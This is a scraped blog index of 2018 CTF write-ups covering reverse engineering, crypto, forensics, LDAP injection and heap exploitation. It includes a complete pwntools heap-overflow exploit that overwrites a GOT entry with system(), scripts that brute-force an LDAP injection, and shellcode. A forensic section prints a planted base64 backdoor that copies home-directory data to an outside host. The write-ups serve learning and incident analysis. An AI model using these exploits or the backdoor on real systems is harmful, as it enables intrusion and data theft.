elements. The first one is the binary (mabaker) and the second is a compressed folder of encrypted docx document. As said in the challenge decryption, we need to find a way to decrypt those files. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:9:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"The algorithm After reading the machine for the whole program we extracted the core algorithm for the key setup. The keys are generated in the following way. The first part is getting the binary pid and using to seed a random number generator. This code seems to to a lot of complex operations, but after playing around with it by generating all possible input values for srand (the range of pids), we noticed that this code could simplified into “srand(pid % 255);”. The algorithm then generates 256 different keys using rand. As there are only 256 possible seeds, there are only 256 combination of keys. The encryption algorithm is really simplistic, and as we can see in the following screen, it is only a simple a simple xor. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:9:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"The attack We have two critical pieces of information. The first one being that there are only 256 different arrays of keys, and the second one being that the header for docx files is known. The attack is really simple, we the first few bytes of a file, encrypt it with all possible key arrays and see which match the encrypted header. By doing this we only found one possible and it was the right one. Afterwards we only had to decrypt one of the files with the key, open it in word and get the flag ! ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:9:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Curious service - Pwn In this challenge we are being provided with a server binary, the same one is running on the service. The goal of this challenge is guessing the key that the server expects for it to send us the flag. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:10:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"The algorithm The server program is pretty straightforward. It waits for a remote connection, gets the key from the client, generates a key on its own and compares them both. If they match we get the flag, if not we are disconnected. As we can see here, srand is seeded with the current time. Rand is then used to compute the key. And this is where we have a vulnerability, if the current time of our computer is the same as the one on the server (which should be the case with ntp), we can generate a valid key and get the flag ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:10:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"The attack As too many mistakes can be made while translating assembly code to source code, we chose to instrument a server binary with frida, simply call the generate_key function when needed and upload the key to the real server to get the flag. You can see the script we used below. Note: The rd-server-gathering is a patched version of the server binary to change the port of the service. It must ran before executing this script. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:10:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Ma Baker returns - Reverse This challenge is much like the first one as the structure is globally the same. The only difference is added “protections”. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:11:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"The algorithm Across the binary code we can find the same pattern of instructions (add, sub, imul) that can be simplified to a modulo 255. If we look at the code we can see a few calls to SHA1 function and a few loops doing additional rounds of computation on the generated key (as seen in the screenshots below). ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:11:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"The attack This program is vulnerable in the same way as the previous version, as the seed for srand is computed through a module 255 or the pid. Which means even with the added protection, there is a very limited search space for the keys. To get the flag we only had to dump all possible keys and see which when used gave out a correct docx header. We instrumented the program using radare2 to dump all of the keys, you can see the code below. We then tested all of the valid keys on an encrypted docx, and checked which document was correct. Luckily the first document we opened was the right one. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:11:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Vigenere Cipher Cracking - Crypto ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:12:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Finding the key size To find the key size, we can decompose the cipher text in blocks of size k. k being the key size we guess.By only taking the first bytes of each block and appending them in a string, we can then attempt to xor (case 0)with a single byte. Among the 256 possibilities for each k, only the right key length will produce a string containing printable characters. Using this method, we found a key size of 13.Applying the same technique on the third byte (case 2) and others confirmed the hypothesis. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:12:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Finding the key Knowing the key size, we can do the same technique as above with k=13 and test for each 13 bytes of the blocks all 256 possible key values. If the key value is correct, it should produce printable characters that could be encountered in an English text.We were able to recover the key: [69,51,170,26,190,211,28,35,159,239,52,253,109] ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:12:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Decrypting the ciphertext Decryption is simple, we reimplemented the script in Python and inverted the operations: + -\u003e - - -\u003e + ^ -\u003e ^ We can pass the ciphertext and the key to obtain the flag. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:12:3","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Online Banking OTP Token Firstly we open the binary in a debugger. After analyzing, we found that the seed is incremented just after the call to iseed(). We break on 0x0804979E after the seed has been incremented and modify the heap to input the wanted seed. Run the binary again to obtain the wanted token. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:13:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Know Your Brand - Forensic Analysis [Enterprise1] - Forensic ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Setup Just downloaded the Disk Image and run ‘md5sum’ ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Prepare the Volatility Image Part 1 Unlike with Windows, with Linux, we need to build a specific profile for each kernel. Mounting the Disk Image (which contains 3 partitions) revealed that there is two kernel files, vmlinuz-4.4.0-128-generic and vmlinuz-4.4.0-87-generic. We guessed that the latest kernel is used, 4.4.0-87-generic. We have to build the profile with the headers : ‘/usr/src/linux-headers-4.4.0-128-generic/’ ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Prepare the Volatility Image Part 2 We also need the correct system map located in ‘/boot’. So it’s ‘System.map-4.4.0-128-generic’ according to the kernel version. And the flag was : ‘System.map-4.4.0-128-generic-0389596d78ec13beb366d063a4b8c5c0’ ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:3","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Analyse the Memory Dump Part 1 We put our profile into the ‘/tmp/linux-4.4.0-128’ and downloaded the latest version of volatility to avoid some bugs. So we ran : ‘python2 /tmp/volatility-master/vol.py –plugins=/tmp/linux-4.4.0-128 –profile LinuxKernel128x64 -f ~/Downloads/mem.lime.1531387925 linux_netstat’ to list all the connections. We found ‘TCP 172.30.20.80 :60540 10.85.220.55 : 22 ESTABLISHED ssh/24017’ which refers to a connection between a private LAN and an external network. So the IP that sensitive data is being leaked to is ‘10.85.220.55’. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:4","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Analyse the Memory Dump Part 2 We ran : ‘python2 /tmp/volatility-master/vol.py –plugins=/tmp/linux-4.4.0-128 –profile LinuxKernel128x64 -f ~/Downloads/mem.lime.1531387925 linux_psaux | grep 10.85.220.55’ to list all the process and keep only those which have the IP 10.85.220.55 in their command line. Once we have the process with their PID, we summed them. We got : ‘72036’ ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:5","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Locate the Exploited Process Without the grep, we saw that ‘backup-manager’ was suspicious because it seems to be the parent of some leaks with rsync. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:6","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Locate the Malicious Command We checked the contents of ‘/usr/share/backup-manager’ with the original deb from Ubuntu 16.04. We found that ‘/usr/share/backup-manager/md5sum’ was a file that wasn’t in the deb file and ‘/usr/share/backup-manager/actions.sh’ was modified. Its permissions were 744 while the original actions.sh was 644. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:7","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Establish the Obfuscation Mechanism When we look at the contents of ‘/usr/share/backup-manager/md5sum’, we saw : bash -c \"echo 'cnN5bmMgLXZyeiAtLXJzaD0ic3NocGFzcyAtcCB1YnNzaGFkbWluIHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLWwgdWJzc2hhZG1pbiIgL2hvbWUvbGFiIHVic3NoYWRtaW5AMTAuODUuMjIwLjU1Oi9ob21lL3N0b2xlbnNlY3JldHMgJj4vZGV2L251bGwK' | base64 -d | sh Which indicate a base64 encoding. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:8","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Locate the Malicious Call We saw that ‘/usr/share/backup-manager/actions.sh’ was modified and indeed, it called the malware ‘md5sum’ which wasn’t in the original. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:14:9","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Know Your Brand - RSA Analysis - Crypto ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:15:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Analyze Packet Capture Data By loading the pcap into wireshark and looking at the tls traffic, we quickly come across the ciphersuite. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:15:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Decrypt the SSL traffic From wireshark , we dumped the TLS certificate in the DER format. We used openssl to convert it to PEM, and extract its public key. $ openssl x509 -inform der -in cert_extracted.der -outform pem -out cert.pem $ openssl x509 -pubkey -noout -in cert.pem \u003e pubkey.pem We then used RsaCtfTool to crack and recover the private key. $ ~/Documents/Tools/RsaCtfTool/RsaCtfTool.py --publickey pubkey.pem –private \u003e privkey.pem Then we loaded the private key into wireshark and it decrypted the TLS traffic. From this point , we struggled a bit in front of the 150+ decrypted TLS streams. We used tshark to get all the decrypteed stream and grepped for “flag” in it. $ for i in {0..200}; do echo $i \u0026\u0026 tshark -r cap01.pcap -q -o \"ssl.keys_list:172.30.11.10,443,http,privkey.pem\" -z \"follow,ssl,ascii,$i\" |grep -i flag; done 5 minutes later, the flagged popped in our terminal. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:15:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Unzip the second file Using the password of the previous step , we unziped the given zip. By looking at the README.txt file, we figured out that we need to focus on the genCsr.py file. We looked at the commit logs for that file : $ git log – genCsr.py And we found only 2 commits, which gave us all the information for the 3 last questions. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:15:3","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Writeups"],"content":"Simple reverse shell using OpenSSL.","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018admyssion/","tags":["ecw","thales","airbus","ldap injection","web","blind"],"title":"[European Cyber Week] - AdmYSion","uri":"maki.bzh/writeups/ecw2018admyssion/"},{"categories":["Writeups"],"content":"State of the art We only have a login form in front of us: My first move was trying an SQL injection… It was useless, in fact it’s an LDAP injection: Our little asterisk * is matching with all the accounts in the LDAP base, it’s now time to script :D ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018admyssion/:1:0","tags":["ecw","thales","airbus","ldap injection","web","blind"],"title":"[European Cyber Week] - AdmYSion","uri":"maki.bzh/writeups/ecw2018admyssion/"},{"categories":["Writeups"],"content":"Blind LDAP Injection Because I already did an LDAP injection on a famous french challenge platform (it starts by root and ends by -me.org), I know that the payload will have the following aspect )(cn=))\\x00 The cn part will change, it’s a common field in an LDAP base, it means Common Name. The null byte at the end is used to remove the password field. ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018admyssion/:2:0","tags":["ecw","thales","airbus","ldap injection","web","blind"],"title":"[European Cyber Week] - AdmYSion","uri":"maki.bzh/writeups/ecw2018admyssion/"},{"categories":["Writeups"],"content":"Find LDAP fields I built a little dictionary with all the common LDAP fields: c cn dc facsimileTelephoneNumber co gn homePhone jpegPhoto id l mail mobile o ou owner name pager password sn st uid username userPassword And then a little python script to bruteforce them: #!/usr/bin/python3 import requests import string ava = [] url = 'https://web050-admyssion.challenge-ecw.fr/' f = open('dic', 'r') dic = f.read().split('\\n') f.close() for i in dic: r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\x00', 'password':'bla'}) if 'Error: This login is associated with' in r.text: ava.append(str(i)) print(ava) ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018admyssion/:3:0","tags":["ecw","thales","airbus","ldap injection","web","blind"],"title":"[European Cyber Week] - AdmYSion","uri":"maki.bzh/writeups/ecw2018admyssion/"},{"categories":["Writeups"],"content":"looking for the admin email Okay, now I will dig into the mail field trying to find the email address of the administrator (I know my script is very, very ugly, I bruteforced manually each first letter…): #!/usr/bin/python3 import requests import string import itertools from pprint import pprint ava = [] partial = '' no_pass = True charset = string.ascii_lowercase+'.@' url = 'https://web050-admyssion.challenge-ecw.fr/' go = 'Error: This login is associated' go2 = 'Login failed' nogo = 'Account not found, please' while no_pass: no_pass = False for i in charset: payload = '*)(mail=s'+str(partial+i)+'*))\\x00' r = requests.post(url, data = {'login':payload, 'password':'bla'}) if nogo not in r.text: no_pass = True partial += i break print(partial) You can notice the little s in front of my partial variable! I tried to find all a, b etc… And here is why s: s+arah.connor.admin@yoloswag.com looks to be the administrator. To find the username of the account, just change mail field into cn, it gives us: s.connor. And now, how can we find the password? By guessing for sure! Let’s try ‘yoloswag’ as a password: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018admyssion/:3:1","tags":["ecw","thales","airbus","ldap injection","web","blind"],"title":"[European Cyber Week] - AdmYSion","uri":"maki.bzh/writeups/ecw2018admyssion/"},{"categories":["Writeups"],"content":"Simple reverse shell using OpenSSL.","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Find the vulnerability To begin with, I just played with the binary, trying to find bugs in it… After a few seconds I found this: Ok, maybe there is something here, let’s open IDA :D (I hate it). Framed in red: A few malloc declaration. Purple highlight: nickname variable. Green highlight: chatbot variable. According to the previous picture, we can assume that the heap looks like this: Ok, so we saw that the program crashes when I enter too many bytes, let’s see how many it takes: Framed in purple: Generation of the segfault. Framed in red: Offset determination. If we try to overflow 16 bytes after the nickname, we’re here in the heap: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:1:0","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Read everywhere Now, let’s try to display an internal string of the binary as botname! I decided to take this one: Poc: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:2:0","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Hypothesis Ok so now we have something really great. What would happened if I can overwrite a GOT address with the address of the system() function? It would look like this: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:3:0","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Exploit Let’s exploit it :) ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:4:0","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Bypass ASLR I need to find a leak in one the libc functions in order to find the libc base address. Then I’ll be able to find the offset between the base address and the system() function. Leak the __libc_start_main address There is a well-known leak in the __libc_start_main function in the GOT. We can extract the adress of this function: Calculate Libc base address You will need to display /proc/[PID of Chatbot]/maps to get the libc base address and calculate the offset: $ ps -A | grep chat 32576 pts/7 00:00:00 chatbot $ cat /proc/32576/maps [...] f7dda000-f7f87000 r-xp 00000000 fd:00 4456457 /lib32/libc-2.23.so f7f87000-f7f88000 ---p 001ad000 fd:00 4456457 /lib32/libc-2.23.so f7f88000-f7f8a000 r--p 001ad000 fd:00 4456457 /lib32/libc-2.23.so f7f8a000-f7f8b000 rw-p 001af000 fd:00 4456457 /lib32/libc-2.23.so [...] Which one of the displayed libc do we need to choose ? You need to know the system() function address. So your libc base needs to be executable because all the functions in a binary are executable, right ? We can see that only the first one 0xf7dda000 have this permission. Framed in red: In the center, you can see the offset determination. On the right, there is the calculation of the libc base address. Framed in yellow: Top right, our new libc base address (because I restarted the chatbot binary, the ASLR randomized the addresses). On the left, you can check our substraction, it looks like it works :) Another tip, the libc is mapped on memory page, so if after your calculation you have an address that ends with 000 it sounds good. The memory pages are 4Kb long, so 0x1000 in hex. ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:4:1","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"System address We have our libc base address, now we have to find the address of the system() function. Framed in red: System address determination. Framed in yellow: Little addition. Framed in cyan: Check the system address, it looks like it works :) ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:4:2","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Final local exploit At this point, we have everything we need to exploit the binary and get a shell: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:4:3","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Flag As we can see, we don’t have any return of our function, so I use a little binary called ngrok to get a netcat on my laptop (without opening ports). https://ngrok.com/ And then, the graal: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:5:0","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Complete exploit code: #!/usr/bin/python2 from pwn import * #ip = '127.0.0.1' ip = '54.36.205.82' addr_yoPython = 0x08049931 addr_libcStartMain = 0x0804C03C addr_strlengot = 0x0804C038 c = remote(ip, 22000) print(c.recv(4069)) c.sendline(\"nickname\") print(c.recv(4096)) #c.interactive() c.sendline('A'*16+p32(addr_libcStartMain)) c.sendline(\"help\") rawleak = c.recvuntil(\"I\") addr_startmain = rawleak.split('\\x00')[5][:4] # Had to change my split member from 4 to 5 don't know why print('Addr start_main: 0x%x' % u32(addr_startmain)) c.recv(4096) addr_baselibc = u32(addr_startmain) - 0x18540 print('Addr base libc: 0x%x' % addr_baselibc) addr_system = addr_baselibc + 0x3a940 print('System address: 0x%x' % addr_system) c.sendline(\"nickname\") c.recv(4096) c.sendline('A'*16+p32(addr_strlengot)) c.recv(4096) c.sendline(\"botname\") c.recv(4096) c.sendline(p32(addr_system)) c.interactive() ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018chatbot/:5:1","tags":["ecw","thales","airbus","pwn","heap","overflow"],"title":"[European Cyber Week] - Chatbot","uri":"maki.bzh/writeups/ecw2018chatbot/"},{"categories":["Writeups"],"content":"Drone Wars 1 ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:1:0","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"State of the art We have 2 files: Capture.zip and capture.wav. There is a binary file in the zip archive, don’t worry about it for now. After several hours of crawling the internet searching for datas about the .wav files, I found a stego technic: SSTV. https://medium.com/@sumit.arora/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3 I found a tool for linux: qsstv. ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:1:1","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Decoding the .wav I run QSSTV with VLC in background, set my audio output into QSSTV, and: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:1:2","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Flag ECW{da553166e44a3151dfe422c34f693fe6} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:1:3","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Drone Wars Hint 1 Like the first Drone Wars challenge, we have a horrible .wav file. Let’s try with QSSTV: Same thing :) ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:2:0","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Flag ECW{SHELLCODES} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:2:1","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Drone wars 2 In the first challenge, we got a QR code. It contained the following data: 6xVeMcAx2zHJs0WwKjEEDkE5y3X4/+bo5v///xvqG/Eb4xv4mi6ZK8Emc5gAPueqG+pqG/HnqsLF1dXVbwBpfVFLHhtPT05LGxNOThlJABlMThJITxIbGEgdEkxMHBsASE9IVyA= Decoded: \\xeb\\x15^1\\xc01\\xdb1\\xc9\\xb3E\\xb0*1\\x04\\x0eA9\\xcbu\\xf8\\xff\\xe6\\xe8\\xe6\\xff\\xff\\xff\\x1b\\xea\\x1b\\xf1\\x1b\\xe3\\x1b\\xf8\\x9a.\\x99+\\xc1\u0026s\\x98\\x00\u003e\\xe7\\xaa\\x1b\\xeaj\\x1b\\xf1\\xe7\\xaa\\xc2\\xc5\\xd5\\xd5\\xd5o\\x00i}QK\\x1e\\x1bOONK\\x1b\\x13NN\\x19I\\x00\\x19LN\\x12HO\\x12\\x1b\\x18H\\x1d\\x12LL\\x1c\\x1b\\x00HOHW Wow, cool, bullshit. Let’s try with le old bruteforce technique. Rotation? Nope. XOR ? Yes! It was a one byte key. #!/usr/bin/python2 import base64 msg = base64.b64decode('6xVeMcAx2zHJs0WwKjEEDkE5y3X4/+bo5v///xvqG/Eb4xv4mi6ZK8Emc5gAPueqG+pqG/HnqsLF1dXVbwBpfVFLHhtPT05LGxNOThlJABlMThJITxIbGEgdEkxMHBsASE9IVyA=') key = chr(42) s = \"\" for j in range(256): j = chr(j) for i in range(len(msg)): s += chr(ord(msg[i])^ord(j[i%len(j)])) if 'W{' in s: print(s) s = \"\" �?to��_��������1�1�1�1Ұ�� Y�̀1�@1�̀�����ECW{a41eeda19dd3c3fd8be812b78ff61beb} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:3:0","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Flag ECW{a41eeda19dd3c3fd8be812b78ff61beb} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:3:1","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Drone wars hint 2 ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:4:0","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"State of the art We have a JPG picture, a lot of steg stuff can be effective. ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:4:1","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Guessing of the year I went with the steghide tool… And the steghide passphrase: ECW. $ steghide extract -sf DSC20181007160312834378.jpg Entrez la passphrase: (ECW) �criture des donn�es extraites dans \"secret.txt\". $ cat secret.txt ..-. .. .-.. . / ... --- ..- .-. -.-. . / -....- # / --. ..-. ... -.- / -.. . -- --- -.. / -....- # / .--. .- -.-. -.- . - / -.. . -.-. --- -.. . .-. / -....- # / ..-. .. .-.. . / ... .. -. -.- ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:4:2","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Morse to binary https://www.dcode.fr/code-morse Input: ..-. .. .-.. . / ... --- ..- .-. -.-. . / -....- / --. ..-. ... -.- / -.. . -- --- -.. / -....- / .--. .- -.-. -.- . - / -.. . -.-. --- -.. . .-. / -....- / ..-. .. .-.. . / ... .. -. -.- Output and flag: FILE SOURCE - GFSK DEMOD - PACKET DECODER - FILE SINK ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:4:3","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Drone wars 3 